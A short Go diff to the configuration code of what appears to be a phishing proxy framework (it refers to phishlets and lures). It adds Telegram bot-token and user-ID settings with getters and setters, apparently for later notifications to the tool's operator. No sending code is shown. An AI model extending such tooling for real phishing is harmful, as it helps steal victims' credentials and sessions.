@@ -76,6 +76,11 @@ type GeneralConfig struct {
 	Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
 }
 
+type TelegramConfig struct {
+	BotAPIToken string `mapstructure:"bot_api_token" json:"bot_api_token" yaml:"bot_api_token"`
+	UserID      string `mapstructure:"user_id" json:"user_id" yaml:"user_id"`
+}
+
 type Config struct {
 	general         *GeneralConfig
 	certificates    *CertificatesConfig
@@ -91,6 +96,7 @@ type Config struct {
 	lureIds         []string
 	subphishlets    []*SubPhishlet
 	cfg             *viper.Viper
+	telegramConfig  TelegramConfig
 }
 
 const (
@@ -116,6 +122,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		phishletNames:   []string{},
 		lures:           []*Lure{},
 		blacklistConfig: &BlacklistConfig{},
+		telegramConfig:  TelegramConfig{},
 	}
 
 	c.cfg = viper.New()
@@ -183,6 +190,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.cfg.UnmarshalKey(CFG_PROXY, &c.proxyConfig)
 	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
 	c.cfg.UnmarshalKey(CFG_CERTIFICATES, &c.certificates)
+	c.cfg.UnmarshalKey("telegram", &c.telegramConfig)
 
 	for i := 0; i < len(c.lures); i++ {
 		c.lureIds = append(c.lureIds, GenRandomToken())
@@ -780,6 +788,19 @@ func (c *Config) GetSiteUnauthUrl(site string) (string, bool) {
 	return "", false
 }
 
+func (c *Config) SaveTelegramConfig() {
+	c.cfg.Set("telegram", c.telegramConfig)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) GetTelegramBotToken() string {
+	return c.telegramConfig.BotAPIToken
+}
+
+func (c *Config) GetTelegramUserID() string {
+	return c.telegramConfig.UserID
+}
+
 func (c *Config) GetBaseDomain() string {
 	return c.general.Domain
 }
@@ -792,8 +813,24 @@ func (c *Config) GetServerBindIP() string {
 	return c.general.BindIpv4
 }
 
+// Add these new methods to set Telegram config values
+func (c *Config) SetTelegramBotToken(token string) {
+	c.telegramConfig.BotAPIToken = token
+	c.cfg.Set("telegram.bot_api_token", token)
+	c.cfg.WriteConfig()
+	log.Info("Telegram bot token set")
+}
+
+func (c *Config) SetTelegramUserID(userID string) {
+	c.telegramConfig.UserID = userID
+	c.cfg.Set("telegram.user_id", userID)
+	c.cfg.WriteConfig()
+	log.Info("Telegram user ID set")
+}
+
 func (c *Config) GetHttpsPort() int {
 	return c.general.HttpsPort
+
 }
 
 func (c *Config) GetDnsPort() int {
